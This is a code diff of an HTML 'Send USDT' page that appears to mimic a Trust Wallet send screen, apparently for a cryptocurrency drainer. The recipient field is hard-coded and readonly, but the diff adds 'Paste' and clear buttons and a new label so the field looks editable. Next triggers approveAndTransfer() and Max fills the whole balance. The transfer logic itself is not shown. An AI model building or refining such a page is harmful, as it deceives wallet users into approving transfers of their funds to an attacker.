@@ -6,27 +6,44 @@
   <title>Send USDT</title>
   <link rel="stylesheet" href="style.css" />
   <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+  <style>
+    .btn-center {
+      display: flex;
+      justify-content: center;
+    }
+    .btn-center button {
+      max-width: 300px;
+    }
+    .input-wrapper span,
+    .amount-wrapper span {
+      cursor: pointer;
+    }
+  </style>
 </head>
 <body>
   <div class="container">
-    <label for="address">Recipient Address</label>
+    <label for="address">Address or Domain Name</label>
     <div class="input-wrapper">
       <input type="text" id="address" value="0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999" readonly>
+      <span onclick="clearAddress()">✕</span>
+      <span onclick="pasteAddress()">Paste</span>
     </div>
 
     <label for="amount">Amount</label>
     <div class="amount-wrapper">
-      <input type="number" id="amount" placeholder="0.00" oninput="updateFiat()" />
+      <input type="number" id="amount" placeholder="USDT Amount" oninput="updateFiat()" />
       <span>USDT</span>
       <span onclick="fillMax()">Max</span>
     </div>
 
     <div class="amount-line" id="fiat">≈ $0.00</div>
 
-    <button onclick="approveAndTransfer()">Next</button>
+    <div class="btn-center">
+      <button onclick="approveAndTransfer()">Next</button>
+    </div>
   </div>
 
-  <!-- Trust Wallet + BNB Chain Auto Setup -->
+  <!-- Trust Wallet Chain Fix -->
   <script>
     window.addEventListener("load", () => {
       if (document.body.innerHTML.trim() === "") {
